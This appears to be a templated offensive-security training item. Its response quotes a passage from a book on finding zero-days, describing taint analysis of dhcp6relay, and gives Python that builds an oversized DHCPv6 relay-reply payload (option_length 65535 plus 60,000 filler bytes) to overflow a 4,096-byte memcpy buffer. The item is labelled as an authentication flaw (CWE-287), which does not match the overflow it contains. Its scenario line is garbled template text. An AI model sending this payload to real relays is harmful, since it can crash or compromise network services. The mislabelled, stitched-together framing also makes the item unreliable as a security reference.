# AUTH — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: auth
- cwe: CWE-287

## Scenario

Describe methodology and key techniques for From Day Zero to Zero Day — Taint Analysis: Taint Analysis   33 (cont.) during an authorized assessment.

## Analysis / Response

Based on From Day Zero to Zero Day (web-relevant) (Taint Analysis   33 (cont.)):

byte values, while the latter removes padding bytes between struct members. You need to make one important change to trigger the vulnerability. The sink-to-source analysis revealed that the vulnerability lay in an overly large option_length being used as the size of a memcpy to a 4,096-byte destina- tion buffer, so set option_length to the maximum 65535 value and add addi- tional overflow bytes to the end of the payload. Since dhcp6relay converts the values of option_code and option_length from network to host byte order, con- vert these values to network byte order first using socket.htons. You’ll also want to set the other struct members that don’t affect the taint flow to the vulnerability, such as hop_count and link_address, to default or dummy values. Finally, connect to the IPv6 address you configured for dhcp6relay earlier and send the bytes using the socket library: import socket from struct import pack UDP_IP = "2a00:7b80:451:1::10" # MODIFY THIS UDP_PORT = 547 DHCPv6_MESSAGE_TYPE_RELAY_REPL = 13 OPTION_RELAY_MSG = 9 PAYLOAD = pack("B", DHCPv6_MESSAGE_TYPE_RELAY_REPL) # uint8_t msg_type PAYLOAD += pack("B", 1) # uint8_t hop_count # struct in6_addr link_address / unsigned char s6_addr[16] PAYLOAD += b"A" * 16 # struct in6_addr peer_address / unsigned char s6_addr[16] PAYLOAD += b"A" * 16 PAYLOAD += pack("H", socket.htons(OPTION_RELAY_MSG)) # uint16_t option_code PAYLOAD += pack("H", socket.htons(65535)) # uint16_t option_length PAYLOAD += b"B" * 60000

Use only on systems you are authorized to test; capture evidence and include remediation.
